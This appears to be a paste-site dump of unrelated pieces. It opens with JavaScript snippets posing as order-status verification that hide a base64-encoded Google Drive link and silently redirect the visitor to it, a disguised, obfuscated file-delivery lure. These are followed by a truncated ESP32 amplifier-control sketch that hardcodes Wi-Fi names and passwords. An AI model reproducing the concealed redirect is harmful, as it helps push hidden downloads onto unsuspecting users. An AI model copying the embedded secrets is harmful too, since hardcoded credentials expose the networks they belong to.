  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
XupbALqd,Products.js,luqlegal,JavaScript,Thursday 10th of April 2025 09:03:15 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/01467/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zh6rjNxV,Order.js,luqlegal,JavaScript,Thursday 10th of April 2025 08:47:23 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/05557/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
dqL2DRaT,1,GaabMM88,C++,Thursday 10th of April 2025 08:42:07 AM CDT,"int stacount = 0;
const char compile_date[] = __DATE__;
//Included with the name printing
#include <HardwareSerial.h>
#include ""AiEsp32RotaryEncoder.h""
#include ""Arduino.h""
#include ""Wire.h""
#include <Adafruit_NeoPixel.h>
#include <esp_task_wdt.h>
#include <WiFi.h>
//#include <RTClib.h>
#include <ErriezDS3231.h>
#include ""PinDefinitionsAndMore.h""  // Define macros for input and output pin etc.
#include <IRremote.hpp>
#include ""TC74.h""

#define sense1 2000
#define sense2 2050
#define ROTARY_ENCODER_A_PIN 35
#define ROTARY_ENCODER_B_PIN 32
#define ROTARY_ENCODER_BUTTON_PIN 33
#define ROTARY_ENCODER_VCC_PIN -1 /* 27 put -1 of Rotary encoder Vcc is connected directly to 3,3V; else you can use declared output pin for powering rotary encoder */
#define ROTARY_ENCODER_STEPS 4
#define powerSW 13
#define inputSW
#define dcSenseRight 19  //-> pin / dcErrorRight (current state) / dcErroRightLast (last state of dcErrorRight)
#define dcSenseLeft 18   //-> pin / dcErrorLeft (current state) / dcErrorLeftLast (last state of dcErrorLeft)
#define acSense 5        //-> pin / acError (current state) / acErrorLast (last state of acError)
#define pwr 16           // Standby relay
#define speaker 17       // Speaker relay
#define WS2812 2         // WS2812 pin
#define NUMPIXELS 8      // number of LED
#define LDR 12           // LDR pin
#define RXN_PIN 26       // Serial1 RX to Nextion TX
#define TXN_PIN 25       // Serial1 TX to Nextion RX
#define RX_PIN 27        // Serial2 RX a Amp TX
#define TX_PIN 14        // Serial2 TX a Amp RX
#define SDA 21           // I2C Thermometer, Expander, etc.
#define SCL 22

#define boot 0  // Nextion page number 0..11
#define standby 1
#define main 2
#define digiSetup 3
#define ampSetup 4
#define digiInput 5
#define digiPreset 6
#define dsp1 7
#define dsp2 8
#define dsp3 9
#define info 10
#define dataRecord 11

#define DATE_STRING_SHORT 3
#define ONs 1
#define OFFs 0

//RTC_DS3231 rtc;
ErriezDS3231 rtc;
TC74 tmp1(0x4A);         //A2 Address
TC74 tmp2(0x4B);         //A3 Address
HardwareSerial uart(2);  // Uso de la interfaz de hardware Serial2
Adafruit_NeoPixel pixels(NUMPIXELS, WS2812, NEO_RGB + NEO_KHZ800);
AiEsp32RotaryEncoder rotaryEncoder = AiEsp32RotaryEncoder(ROTARY_ENCODER_A_PIN, ROTARY_ENCODER_B_PIN, ROTARY_ENCODER_BUTTON_PIN, ROTARY_ENCODER_VCC_PIN, ROTARY_ENCODER_STEPS);

// Month names in flash
const char monthNames_P[] PROGMEM = ""JanFebMarAprMayJunJulAugSepOctNovDec"";
// Day of the week names in flash
const char dayNames_P[] PROGMEM = ""SunMonTueWedThuFriSat"";

const int powerOffDelayForRelay = 400;  //in millis seconds
//const byte LDR = 12;                //Light Dependant Resistor
const long eventTime_1_LDR = 5000;  //check brigtness in ms
unsigned long previousTime_1 = 0, beepMillis = 0, protectMillis = 0, irMillis = 0, irVolMillis, strengthMillis = 0, lastMillis = 0;
unsigned long ac_time = 0, ac_time_last = 0;
boolean powerState = 0, lastPowerState = 0, nextionSetTimebit = 1;
int offset = 2, beep = 0, NextionPage = 0;
int digiVolume = 0, dmute = 0, lastPressed = 0, source = 0, dim = 0, dimN = -1, task = 0;
int initDigi = 1, toDigi = 1;
int dcErrorRight = 1, dcErrorRightLast = -1, dcErrorLeft = 1, dcErrorLeftLast = -1, acError = 1, acErrorLast = -1;  //variables for protection

int debug = 1;  //1 - writing all data; 2 - only protection data

int ac_protect = 0;
int self_test = 0;
int currentPage = -1;  // current page of nextion
int irLastCode = -1;
int volStep = 2;
int sourceS = 0;
int devState = 1;
int speaker1timeon;
unsigned long speakerMillis;
String sReceived, nReceived;
int ev, honap, nap, ora, perc, mperc, hetnapja;  //These are where we store the RTC values.
int speakerRelayEnable, speakerRelaySet, pwrRelayEnable, pwrRelaySet;
int protectionErrors;

void readProtection();
void i2cCheck();

#if (1)
const char* ssid = ""TP-Link_F072"";
const char* password = ""12778072"";
#else
const char* ssid = ""SirRouter"";
const char* password = ""19801989"";
#endif

struct s_i2cdev {
  String name;
  int address;
  int state;
  String stateStr;
};
s_i2cdev tc74_1;
s_i2cdev tc74_2;
s_i2cdev rtcModule;
s_i2cdev rtcEEPROM;
s_i2cdev dspModule;
s_i2cdev dspEEPROM;

class c_RelayClass {
public:
  int speakerEnable;
  int powerEnable;
  // CLASS
  void spk(int set) {  // send SPK relay state
    if (speakerEnable == 1) {
      Serial.print(""Speakers is: "" + set);
      if (set) {
        Serial.println("" ON"");
      } else {
        Serial.println(""OFF"");
      }
      digitalWrite(speaker, set);
    } else {
      digitalWrite(speaker, LOW);
    }
  }

  void power(int set) {  // send SPK pwr state
    if (powerEnable == 1) {
      Serial.print(""Main relay is: "" + set);
      if (set) {
        Serial.println("" ON"");
      } else {
        Serial.println(""OFF"");
      }
      digitalWrite(pwr, set);
    } else {
      digitalWrite(pwr, LOW);
    }
  }
} relays;

class c_NextionWrite {
public:
  void init(int speed, int RXN, int TXN) {
    Serial1.begin(speed, SERIAL_8N1, RXN, TXN);
    // if (debug) Serial.printf(""Serial1 - Speed: %d, RX-pin: %d, TX-pin: %d \n"", speed, RX, TX);
  }
  void txt(String Name, String text) {
    Serial1.print(Name + "".txt=\"""" + text + ""\""\xFF\xFF\xFF"");
    if (debug == 1) Serial.println(Name + "".txt=\"""" + text + ""\""\xFF\xFF\xFF"");
  }
  void val(String Name, int value) {
    Serial1.print(Name + "".val="" + String(value) + ""\xFF\xFF\xFF"");
    if (debug == 1) Serial.print(Name + "".val="" + String(value) + ""\xFF\xFF\xFF"");
  }
  void systemVal(String Name, int value) {
    Serial1.print(Name + ""="" + String(value) + ""\xFF\xFF\xFF"");
    if (debug == 1) Serial.print(Name + ""="" + String(value) + ""\xFF\xFF\xFF"");
  }
  void pageChange(int Name) {
    Serial1.print(""page "" + String(Name) + ""\xFF\xFF\xFF"");
    if (debug == 1) Serial.print(""page "" + String(Name) + ""\xFF\xFF\xFF"");
    //Serial.println(""EPG"");
    NextionPage = Name;
  }
  void setPco(String name, int pco) {  // for global variable need a page number / page name too
    Serial1.print(name + "".pco="" + String(pco) + ""\xFF\xFF\xFF"");
    if (debug == 1) Serial.print(name + "".pco="" + String(pco) + ""\xFF\xFF\xFF"");
  }
  void timerEnable(String name, int en) {
    Serial1.print(name + "".en="" + String(en) + ""\xFF\xFF\xFF"");
  }
  void vis(String name, int en) {
    Serial1.print(""vis "" + name + "","" + String(en) + ""\xFF\xFF\xFF"");
  }
  void dim(int en) {
    Serial1.print(""dim="" + String(en) + ""\xFF\xFF\xFF"");
  }
  void touchSet(String name, int en) {  //nextion.touchSet(""preset"", 0/1);
    Serial1.print(""tsw "" + String(name) + "","" + String(en) + ""\xFF\xFF\xFF"");
  }
  void click(String name, int en) {
    Serial.print(""click "" + String(name) + "","" + en + ""\xFF\xFF\xFF"");
    Serial1.print(""click "" + String(name) + "","" + en + ""\xFF\xFF\xFF"");
  }
  void setTime(int ev, int honap, int nap, int ora, int perc, int mperc, int hetnapja) {
    //hour = (hour + 24) % 24;
    Serial1.print(""rtc0="" + String(ev) + ""\xFF\xFF\xFF"");     //year
    Serial1.print(""rtc1="" + String(honap) + ""\xFF\xFF\xFF"");  //month
    Serial1.print(""rtc2="" + String(nap) + ""\xFF\xFF\xFF"");    //day
    Serial1.print(""rtc3="" + String(ora) + ""\xFF\xFF\xFF"");    //hour
    Serial1.print(""rtc4="" + String(perc) + ""\xFF\xFF\xFF"");   //minute
    Serial1.print(""rtc5="" + String(mperc) + ""\xFF\xFF\xFF"");  //second
    // Serial1.print(""rtc6="" + String(hetnapja) + ""\xFF\xFF\xFF""); //days of the Week
    Serial.printf(""Nextion time/ hour: %d min: %d sec: %d \n"", ora, perc, mperc);
    Serial.println(""--------------------"");
  }
};
c_NextionWrite nextion;

class c_power {
public:
  int state = 0;
  int lastState;
  void on() {
    state = ONs;
    relays.power(ONs);
    while (protectionErrors) {
      readProtection();
    }
    relays.spk(ONs);
    nextion.pageChange(main);
  }

  int firstInitial() {
    nextion.val(""vaMCU"", 0);
    nextion.val(""boot.vaSupply"", 0);
    nextion.val(""boot.vaProtection"", 0);
    nextion.val(""vaRTC"", 0);
    nextion.val(""vaArylic"", 0);
    if (debug == 3) {
      Serial.printf(""Initial check\n"");
    }
    //-----
    while (state == 0) {  //Nextion <-> ESP32 communication check
      if ((lastMillis + 1500) < millis()) {
        nextion.val(""vaMCU"", 23);
        lastMillis = millis();
      }
      if (Serial1.available() > 0) {
        nReceived = Serial1.readStringUntil(';');
        Serial.println(nReceived);
      }
      if (nReceived.endsWith(""42"")) {
        nextion.val(""vaMCU"", 1);
        state = 1;
        //exit;  //break;
      }
      Serial.println(nReceived);
      Serial.printf(""State: %i\n"", state);
    }
    Serial.printf(""Nextion Communication test done. State: %i\n"", state);

    //------
    while (state == 1) {  //I2C check
      //to be written later
      i2cCheck();
      nextion.val(""vaRTC"", 1);
      state = 2;
      Serial.printf(""State: %i\n"", state);
    }
    Serial.printf(""RTC check done. State: %i\n"", state);
    lastMillis = millis();

  
    relays.powerEnable = 1; //AC relay ON (Enabled)
    relays.speakerEnable=0;
    relays.power(ONs);
    delay(1000);

    //-----
    do {
      readProtection();
      Serial.println(""ReadProtection"");
    } while (protectionErrors);
    nextion.val(""boot.vaSupply"", 1);
    nextion.val(""boot.vaProtection"", 1);
    Serial.printf(""Protection check done. State: %i\n"", state);

    int Arylic = 0;
    Serial.printf(""State: %i\n"", state);
    uart.print(""SYS:REBOOT;"");

    while (state == 2) {
      Serial.println(""Reboot sent"");
      do {  //
        if (uart.available() > 0) {
          sReceived = uart.readStringUntil(';');
          Serial.print(""rrrrrrrrrrr "");
          Serial.println(sReceived);
          if (sReceived.startsWith(""MUT:"")) {  //aud
            Serial.println(""In the loop"");

            nextion.val(""vaArylic"", 1);
            delay(1000);

            state = 3;
          }
          sReceived = """";
        }
      } while (state == 2);
      // uart.print(""SYS:STANDBY;"");
    }

    if (debug == 3) {
      Serial.printf(""All check done. State: %i\n"", state);
    }
    Serial.println(state);
    // If all ok, then automatic page change: ""Standby""
    return 1;
  }
} power;

void reduce4n() {
  nReceived = nReceived.substring(4);
  Serial.println(""-----reduce4n----"");
}
void initWiFi() {  ////////////////////////////////// INIT WIFI
  WiFi.mode(WIFI_STA);
  WiFi.begin(ssid, password);
  Serial.print(""Connecting to WiFi .."");
  while (WiFi.status() != WL_CONNECTED) {
    Serial.print('.');
    delay(1000);
  }
  Serial.println(WiFi.localIP());
}
void readRTC() {  ////////////////////////////////// DS3231 realtime clock module
  char name[DATE_STRING_SHORT + 1];
  uint8_t hour;
  uint8_t min;
  uint8_t sec;
  uint8_t mday;
  uint8_t mon;
  uint16_t year;
  uint8_t wday;

  // Read date/time
  if (!rtc.getDateTime(&hour, &min, &sec, &mday, &mon, &year, &wday)) {
    Serial.println(F(""Read date/time failed""));
    return;
  }

  // Print day week
  strncpy_P(name, &(dayNames_P[wday * DATE_STRING_SHORT]), DATE_STRING_SHORT);
  name[DATE_STRING_SHORT] = '\0';
  // Serial.print(name);
  // Serial.print(F("" ""));

  // Print month
  strncpy_P(name, &(monthNames_P[(mon - 1) * DATE_STRING_SHORT]), DATE_STRING_SHORT);
  name[DATE_STRING_SHORT] = '\0';
  // Serial.print(name);
  // Serial.print(F("" ""));

  // Print day month
  //  Serial.print(mday);
  // Serial.print(F("" ""));

  // Print time
  // Serial.print(hour);
  Serial1.print(""rtc3="" + String(hour) + ""\xFF\xFF\xFF"");  //hour
                                                           // Serial.print(F("":""));
                                                           //  if (min < 10) {
                                                           //   Serial.print(F(""0""));
                                                           //  }
                                                           // Serial.print(min);
  Serial1.print(""rtc4="" + String(min) + ""\xFF\xFF\xFF"");   //minute
                                                           // Serial.print(F("":""));
                                                           // if (sec < 10) {
                                                           //   Serial.print(F(""0""));
                                                           // }
                                                           // Serial.print(sec);
  Serial1.print(""rtc5="" + String(sec) + ""\xFF\xFF\xFF"");   //second
                                                           // Serial.print(F("" ""));

  // Print year
  // Serial.println(year);

  // Wait a second
  //delay(1000);
}
void rotary_loop() {  ////////////////////////////////// ENCODER LOOP
                      // int tempVol;
                      // if(rotaryEncoder.encoderChanged()){
                      //    tempVol=rotaryEncoder.readEncoder();
                      //    Serial.print(""-"");
                      // }
  if (rotaryEncoder.encoderChanged()) {
    if (debug == 1) Serial.print(""Value: "");
    if (debug == 1) Serial.println(rotaryEncoder.readEncoder());
    if (NextionPage == main) {
      uart.print(""VOL:"" + String(rotaryEncoder.readEncoder()) + "";"");
      Serial.println(rotaryEncoder.readEncoder());
      digiVolume = rotaryEncoder.readEncoder();
    }
    int temp1 = rotaryEncoder.readEncoder();
  }
  if (rotaryEncoder.isEncoderButtonClicked()) {
    rotary_onButtonClick();
  }
}
void rotary_onButtonClick() {  ////////////////////////////////// ENCODER SW
  static unsigned long lastTimePressed = 0;
  //ignore multiple press in that time milliseconds
  if (millis() - lastTimePressed < 500) {
    return;
  }
  lastTimePressed = millis();
  if (debug == 1) Serial.print(""button pressed "");
  if (debug == 1) Serial.print(millis());
  if (debug == 1) Serial.println("" milliseconds after restart"");
  if (dmute == 0) {
    uart.print(""MUT:1;"");
  } else {
    uart.print(""MUT:0;"");
  }
}
void IRAM_ATTR readEncoderISR() {  ////////////////////////////////// ENCODER INTERRUPT
  rotaryEncoder.readEncoder_ISR();
}
void IRAM_ATTR stateRight_ISR() {  ////////////////////////////////// RIGHT INTERRUPT
  dcErrorRight = 1;
}
void IRAM_ATTR stateLeft_ISR() {  ////////////////////////////////// LEFT INTERRUPT
  dcErrorLeft = 1;
}
void IRAM_ATTR stateAC_ISR() {  ////////////////////////////////// AC INTERRUPT
  ac_time = millis();
  if (ac_time - ac_time_last > 250) {
    acError = 1;
    ac_protect = 1;
    digitalWrite(pwr, LOW);
    ac_time_last = ac_time;
  }
}
void meta(int t, int e, int v, int i) {  ////////////////////////////////// DIGI METADATA
  nextion.vis(""main.title"", t);
  nextion.vis(""main.elapsed"", e);
  nextion.vis(""main.vendor"", v);
  nextion.vis(""main.infoText"", i);
}
void beep_2k() {  ////////////////////////////////// 2KhZ BEEP
  unsigned long currentMillis = millis();
  if (currentMillis - beepMillis >= 1000) {
    if (beep == 0) {
      // tone(12, 2000, 50);
    } else {
      // tone(12, 2000, 50);
    }
    beepMillis = currentMillis;
  }
}
void beep_3k() {  ////////////////////////////////// 3KhZ BEEP
  unsigned long currentMillis = millis();
  if (currentMillis - beepMillis >= 2000) {
    if (beep == 0) {
      // tone(12, 3000, 1000);
    } else {
      // tone(12, 3000, 1000);
    }
    beepMillis = currentMillis;
  }
}
void inputLed(int input) {  ////////////////////////////////// LED FOR SOURCE
  source = input;
  int r = 0, g = 0, b = 0;
  switch (input) {
    case 0:  // WiFi - net
      // if (powerState == 0) break;
      r = 59;
      g = 60;
      b = 61;
      break;
    case 1:  // Bluetooth - bt
      // if (powerState == 0) break;
      r = 0;
      g = 0;
      b = 50;
      break;
    case 2:  // Line-In - line_in
      // if (powerState == 0) break;
      r = 0;
      g = 50;
      b = 0;
      break;
    case 3:  // SPDIF - opt
      // if (powerState == 0) break;
      r = 50;
      g = 0;
      b = 0;
      break;
    case 4:  // USB-DAC - usb dac
      r = 12;
      g = 67;
      b = 5;
      break;
    case 5:  //Standby
      r = 55;
      g = 35;
      b = 0;
      break;
    case 6:  //NET connect
      r = 59;
      g = 60;
      b = 61;
      break;
    case 7:  //NET disconnect
      r = 29;
      g = 30;
      b = 31;
      break;
    case 8:  //BT connect
      r = 0;
      g = 0;
      b = 50;
      break;
    case 9:  //BT disconnect
      r = 0;
      g = 0;
      b = 10;
      break;
  }

  for (int i = 0; i < NUMPIXELS; i++) {
    pixels.setPixelColor(i, pixels.Color(g, r, b));
  }
  pixels.show();  // Send the updated pixel colors to the hardware.
}
void functionLed(int function) {  ////////////////////////////////// LED FOR FUNCTIONS
  task = function;
  int r = 0, g = 0, b = 0;
  switch (function) {
    case 0:  // task is ""ON""
      if (powerState == 0) break;
      r = 49;
      g = 50;
      b = 51;
      break;
    case 1:  // task is ""OFF""
      if (powerState == 0) break;
      r = 0;
      g = 0;
      b = 50;
      break;
    case 2:  // task is ""DC ERROR""
      if (powerState == 0) break;
      r = 0;
      g = 50;
      b = 0;
      break;
    case 3:  // task is ""Temp ERROR""
      if (powerState == 0) break;
      r = 50;
      g = 0;
      b = 0;
      break;
    case 4:  // task is ""System starting...""
      r = 55;
      g = 35;
      b = 0;
      break;
  }
  for (int i = 0; i < NUMPIXELS; i++) {
    pixels.setPixelColor(i, pixels.Color(g, r, b));
  }
  pixels.show();  // Send the updated pixel colors to the hardware.
}
void senseBrightness() {  ////////////////////////////////// SENSE BRIGHTNESS
  unsigned long currentTime = millis();
  if (currentTime - previousTime_1 >= eventTime_1_LDR) {
    String m;
    switch (analogRead(LDR)) {
      case 0 ... 40:
        dimN = 25;
        m = ""Dark"";
        break;
      case 41 ... 800:
        dimN = 40;
        m = ""Light"";
        break;
      case 801 ... 2000:
        dimN = 60;
        m = ""Bright"";
        break;
      case 2001 ... 3200:
        dimN = 80;
        m = ""Very Bright"";
        break;
      case 3201 ... 4500:
        dimN = 100;
        m = ""Very Very Bright"";
        break;
    }
    if (dim != dimN) {
      nextion.val(""ampSetup.nDimESP"", dimN);
      nextion.val(""ampSetup.hSlideESP"", dimN);
      Serial.println("" => "" + m);
      Serial.println(analogRead(LDR));
      dim = dimN;
    }
    previousTime_1 = currentTime;
  }
}
void senseTemp() {  ////////////////////////////////// SENSE TEMPERATURE
  static unsigned long timer1, timer2;
  if (millis() - timer1 > sense1) {  // firtst --> 1st
    timer1 = millis();
    //Serial.print(""Temp 1: "");
    //Serial.println(tmp1.readTemperature('c'));
    if (NextionPage == ampSetup) nextion.val(""ampSetup.nTempLeft"", tmp1.readTemperature('c'));
  }
  if (millis() - timer2 > sense2) {
    timer2 = millis();
    //Serial.print(""Temp 2: "");
    //Serial.println(tmp2.readTemperature('C'));
    if (NextionPage == ampSetup) nextion.val(""ampSetup.nTempRight"", tmp2.readTemperature('c'));
  }
}
void readProtection() {  ////////////////////////////////// READ COMPLETE PROTECTION (AC+DC)
  acError = !digitalRead(acSense);
  dcErrorRight = digitalRead(dcSenseRight);
  dcErrorLeft = digitalRead(dcSenseLeft);
  protectionErrors = dcErrorRight + dcErrorLeft + acError;

  if (dcErrorRight != dcErrorRightLast) {
    if (dcErrorRight == 0) {
      if (debug == 2) Serial.println(""Right channel is OK!"");
      //nextion.systemVal(""warning"", 0);
      nextion.val(""ampSetup.vaRight"", 0);
      if (dcErrorLeft == 0 && self_test == 1) nextion.val(""boot.vaProtection"", 1);
    }
    if (dcErrorRight == 1) {
      if (debug == 2) Serial.println(""DC voltage on Right channel!"");
      nextion.systemVal(""warning"", 1);
      nextion.val(""ampSetup.vaRight"", 1);
      if (self_test == 1) nextion.val(""boot.vaProtection"", 0);
    }
    dcErrorRightLast = dcErrorRight;
  }

  if (dcErrorLeft != dcErrorLeftLast) {
    if (dcErrorLeft == 0) {
      if (debug == 2) Serial.println(""Left channel is OK!"");
      //nextion.systemVal(""warning"", 0);
      nextion.val(""ampSetup.vaLeft"", 0);
      if (dcErrorRight == 0 && self_test == 1) nextion.val(""boot.vaProtection"", 1);
    }
    if (dcErrorLeft == 1) {
      if (debug == 2) Serial.println(""DC voltage on Left channel!"");
      nextion.systemVal(""warning"", 1);
      nextion.val(""ampSetup.vaLeft"", 1);
      if (self_test == 1) nextion.val(""boot.vaProtection"", 0);
    }
    dcErrorLeftLast = dcErrorLeft;
  }

  if (dcErrorLeft == 1 || dcErrorRight == 1) {
    digitalWrite(speaker, LOW);
    //AC relay OFF
    nextion.vis(""ampSetup.reset"", 1);
    Serial.println(""DC voltage on output, speakers is OFF"");
  }

  if (acError != acErrorLast) {
    if (ac_protect == 1) {
      Serial.println(""Interrupt on AC pin"");
    }
    if (acError == 0) {
      if (debug == 2) Serial.println(""AC is OK!"");
      nextion.systemVal(""warning"", 0);
      nextion.val(""ampSetup.vaAC"", 0);
      //nextion.val(""boot.vaSupply"", 1);
    }
    if (acError == 1) {
      if (debug == 2) Serial.println(""Missing AC voltage!"");
      nextion.systemVal(""warning"", 1);
      nextion.val(""ampSetup.vaAC"", 1);
      //nextion.val(""boot.vaSupply"", 1);  // -> 0
      ac_protect = 0;
    }
    acErrorLast = acError;
  }
}
void readAC() {  ////////////////////////////////// READ POWER SUPPLY
  acError = digitalRead(acSense);

  if (acError != acErrorLast) {
    if (ac_protect == 1) {
      Serial.println(""Interrupt on AC pin"");
    }
    if (acError == 0) {
      if (debug == 2) Serial.println(""AC is OK!"");
      nextion.systemVal(""warning"", 0);
      nextion.val(""ampSetup.vaAC"", 0);
      nextion.val(""boot.vaSupply"", 1);
    }
    if (acError == 1) {
      if (debug == 2) Serial.println(""Missing AC voltage!"");
      nextion.systemVal(""warning"", 1);
      nextion.val(""ampSetup.vaAC"", 1);
      nextion.val(""boot.vaSupply"", 1);  // -> 0
      ac_protect = 0;
    }
    acErrorLast = acError;
  }
}
void readSignal() {
  if (strengthMillis + 1000 < millis() && source == 0) {
    uart.print(""WSS;"");
    strengthMillis = millis();
  }
  if (strengthMillis + 1000 < millis() && source == 1) {
    uart.print(""BSS;"");
    strengthMillis = millis();
  }
}
int i2cSend(int address) {
  Wire.beginTransmission(address);
  return Wire.endTransmission();
}
int numDevices = 6;
void i2cCheck() {
  numDevices = 6;

  tc74_1.state = i2cSend(tc74_1.address);
  numDevices--;
  (tc74_1.state == 0) ? tc74_1.stateStr = ""OK"" : tc74_1.stateStr = ""FAIL"";
  Serial.printf(""%s State: %s  I2C state: %i\n"", tc74_1.name, tc74_1.stateStr, tc74_1.state);
  //------------------------------
  tc74_2.state = i2cSend(tc74_2.address);
  numDevices--;
  (tc74_2.state == 0) ? tc74_2.stateStr = ""OK"" : tc74_2.stateStr = ""FAIL"";
  Serial.printf(""%s State: %s\n"", tc74_1.name, tc74_1.stateStr);
  //------------------------------
  rtcModule.state = i2cSend(rtcModule.address);
  numDevices--;
  (rtcModule.state == 0) ? rtcModule.stateStr = ""OK"" : rtcModule.stateStr = ""FAIL"";
  Serial.printf(""%s State: %s\n"", tc74_2.name, tc74_2.stateStr);
  //------------------------------
  rtcEEPROM.state = i2cSend(rtcEEPROM.address);
  numDevices--;
  (rtcEEPROM.state == 0) ? rtcEEPROM.stateStr = ""OK"" : rtcEEPROM.stateStr = ""FAIL"";
  Serial.printf(""%s State: %s\n"", rtcEEPROM.name, rtcEEPROM.stateStr);
  //------------------------------
  dspModule.state = i2cSend(dspModule.address);
  numDevices--;
  (dspModule.state == 0) ? dspModule.stateStr = ""OK"" : dspModule.stateStr = ""FAIL"";
  Serial.printf(""%s State: %s\n"", dspModule.name, dspModule.stateStr);
  //------------------------------
  dspEEPROM.state = i2cSend(dspModule.address);
  numDevices--;
  (dspEEPROM.state == 0) ? dspEEPROM.stateStr = ""OK"" : dspEEPROM.stateStr = ""FAIL"";
  Serial.printf(""%s State: %s\n"", dspEEPROM.name, dspEEPROM.stateStr);

  if (numDevices == 0) {
    //Serial.println(""I2C devices OK"");
  }
}

void setup() {  ////////////////////////////////// START OF SETUP
  Wire.begin(SDA, SCL);
  Serial.begin(115200);
  Serial1.begin(115200, SERIAL_8N1, RXN_PIN, TXN_PIN);
  uart.begin(115200, SERIAL_8N1, RX_PIN, TX_PIN);
  while (!Serial1)
    ;
  while (!uart)
    ;
  rtc.begin();
  tmp1.begin();
  tmp2.begin();
  pixels.begin();  // INITIALIZE NeoPixel strip object (REQUIRED)
  //clock.setDateTime(__DATE__, __TIME__);
  //rtc.adjust(DateTime(F(__DATE__), F(__TIME__)));   // When uploading the code, the computer's time settings are passed to the RTC. We REM it out the next time we upload.
  //rtc.adjust(DateTime(F(__DATE__), F(__TIME__)));

  tc74_1 = { ""TempL"", 0x4A, 0, ""FAIL"" };  //TC74 LEFT
  tc74_2 = { ""TempR"", 0X4B, 0, ""FAIL"" };  //TC74 RIGHT
  rtcModule = { ""RTC"", 0x68, 0, ""FAIL"" };
  rtcEEPROM = { ""RTC_EEPROM"", 0x57, 0, ""FAIL"" };
  dspModule = { ""DSP_Module"", 0x34, 0, ""FAIL"" };
  dspEEPROM = { ""DSP_EEPROM"", 0x50, 0, ""FAIL"" };

  pinMode(pwr, OUTPUT);
  digitalWrite(pwr, LOW);
  pinMode(speaker, OUTPUT);
  digitalWrite(speaker, LOW);

  pinMode(powerSW, INPUT_PULLUP);  // buttons is active LOW
  pinMode(dcSenseRight, INPUT_PULLUP);
  pinMode(dcSenseLeft, INPUT_PULLUP);
  pinMode(acSense, INPUT_PULLUP);
  rotaryEncoder.begin();
  rotaryEncoder.setup(readEncoderISR);
  //ir***********************************************************************************
  //  Serial.println(F(""START "" __FILE__ "" from "" __DATE__ ""\r\nUsing library version "" VERSION_IRREMOTE));
  //Start the receiver and if not 3. parameter specified, take LED_BUILTIN pin from the internal boards definition as default feedback LED
  IrReceiver.begin(IR_RECEIVE_PIN, ENABLE_LED_FEEDBACK);
  //  Serial.print(F(""Ready to receive IR signals of protocols: ""));
  //  printActiveIRProtocols(&Serial);
  //  Serial.println(F(""at pin "" STR(IR_RECEIVE_PIN)));
  //ir***********************************************************************************
  inputLed(4);
  nextion.pageChange(boot);
  nextion.txt(""boot.infoText"", ""System is starting..."");

  bool circleValues = false;
  /*Rotary acceleration introduced 25.2.2021.
   * in case range to select is huge, for example - select a value between 0 and 1000 and we want 785
   * without accelerateion you need long time to get to that number
   * Using acceleration, faster you turn, faster will the value raise.
   * For fine tuning slow down.
   */
  //rotaryEncoder.disableAcceleration(); //acceleration is now enabled by default - disable if you dont need it
  rotaryEncoder.setAcceleration(0);  //or set the value - larger number = more accelearation; 0 or 1 means disabled acceleration
  rotaryEncoder.setEncoderValue(digiVolume);
  rotaryEncoder.setBoundaries(0, 100, circleValues);      //minValue, maxValue, circleValues true|false (when max go to min and vice versa)
  attachInterrupt(dcSenseRight, stateRight_ISR, RISING);  //Interrupts for protection: left: RISING,right: RISING,AC: FALLING
  attachInterrupt(dcSenseLeft, stateLeft_ISR, RISING);
  attachInterrupt(acSense, stateAC_ISR, FALLING);
  //initWiFi();   //in the kitchen, no WIFI :D
  //String LocalIP = String() + WiFi.localIP()[0] + ""."" + WiFi.localIP()[1] + ""."" + WiFi.localIP()[2] + ""."" + WiFi.localIP()[3];
  //Serial.println(WiFi.localIP());
  //Serial.println(LocalIP);
  if (debug) Serial.println(""Starting.."");
  if (debug == 1) Serial.println(""Started..."");
  if (debug == 1) Serial.println(compile_date);
  uart.print(""PMT:1;"");
  uart.print(""BEP:0;"");
  uart.print(""BEP;"");
  uart.print(""PMT;"");
  nextion.touchSet(""main.preset"", 0);
  dcErrorRight = digitalRead(dcSenseRight);
  dcErrorLeft = digitalRead(dcSenseLeft);
  acError = digitalRead(acSense);

  //if (debug == 2) Serial.printf(""AC-%d DCL-%d DCR-%d\n"", acError, dcErrorLeft, dcErrorRight);
  uart.print(""SYS:STANDBY;"");  //Reboot Digi
  Serial.println(""Digi Off"");

  delay(5000);

